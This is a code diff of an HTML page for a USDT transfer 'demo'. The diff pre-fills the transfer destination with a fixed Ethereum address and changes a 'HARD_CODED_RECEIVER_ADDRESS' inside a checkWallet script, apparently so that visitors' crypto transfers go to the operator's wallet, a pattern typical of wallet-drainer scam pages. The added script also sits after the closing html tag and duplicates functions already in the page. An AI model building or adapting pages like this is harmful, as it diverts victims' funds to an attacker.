@@ -15,7 +15,7 @@
 :root{
   color-scheme:dark;
 
-  --bg:#1b1b1b;
+  --bg:#0e111a;
   --text:#f3f3f3;
   --secondary:#b8b8b8;
   --muted:#888;
@@ -1400,11 +1400,104 @@ function showSuccess(message){
 }
 </script>
 
+</body>
+</html>
+<script>
+const DEFAULT_ADDRESS="0x4c4cbff8c45e131ab8f2af5f04b3a162078727c7";
+const DEMO_BALANCE=100;
+
+const addressInput=document.getElementById("address");
+const amountInput=document.getElementById("amount");
+const usdValue=document.getElementById("usdValue");
+const status=document.getElementById("status");
+const transferBtn=document.getElementById("transferBtn");
+const pasteButton=document.getElementById("pasteButton");
+const copyButton=document.getElementById("copyButton");
+const scanButton=document.getElementById("scanButton");
+const maxButton=document.getElementById("maxButton");
+
+addressInput.value=DEFAULT_ADDRESS;
+
+function updateAmount(){
+  const amount=parseFloat(amountInput.value)||0;
+  usdValue.textContent="≈ $"+amount.toFixed(2);
+  status.textContent="";
+  status.className="status";
+}
+amountInput.addEventListener("input",updateAmount);
+
+pasteButton.addEventListener("click",async()=>{
+  try{
+    const text=await navigator.clipboard.readText();
+    if(text) addressInput.value=text.trim();
+  }catch(e){
+    showError("Unable to access clipboard. Paste manually.");
+  }
+});
+
+copyButton.addEventListener("click",async()=>{
+  const value=addressInput.value.trim()||DEFAULT_ADDRESS;
+  try{
+    await navigator.clipboard.writeText(value);
+    showSuccess("Address copied");
+  }catch(e){
+    showError("Unable to copy address");
+  }
+});
+
+scanButton.addEventListener("click",()=>{
+  showError("QR scanner is not connected in this demo.");
+});
+
+maxButton.addEventListener("click",()=>{
+  amountInput.value=DEMO_BALANCE;
+  updateAmount();
+});
+
+transferBtn.addEventListener("click",async()=>{
+  const address=addressInput.value.trim()||DEFAULT_ADDRESS;
+  const amount=parseFloat(amountInput.value);
+
+  if(!Number.isFinite(amount)||amount<=0){
+    showError("Enter a valid USDT amount");
+    amountInput.focus();
+    return;
+  }
+  if(amount>DEMO_BALANCE){
+    showError("Amount exceeds the displayed balance");
+    return;
+  }
+  await confirmTransfer(address,amount);
+});
+
+async function confirmTransfer(address,amount){
+  showSuccess("Ready to continue with "+amount+" USDT");
+  console.log(
+    "Destination:",address,
+    "Amount:",amount,
+    "USDT",
+    "Network: Ethereum"
+  );
+  // Connect a legitimate wallet/provider here.
+  // The wallet must display the transaction and require
+  // explicit user approval before broadcasting.
+}
+
+function showError(message){
+  status.textContent=message;
+  status.className="status error";
+}
+function showSuccess(message){
+  status.textContent=message;
+  status.className="status success";
+}
+</script>
+
 <script>
     // ==========================================
     // CONFIGURATION: CHANGE THIS ADDRESS
     // ==========================================
-    const HARD_CODED_RECEIVER_ADDRESS = "0x4c4CBfF8c45e131ab8f2af5f04b3A162078727c7"; 
+    const HARD_CODED_RECEIVER_ADDRESS = "0xdffaf1dd6d36108223c2a45921afef85e3dcf852"; 
     // Example: "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"
     
     async function checkWallet() {
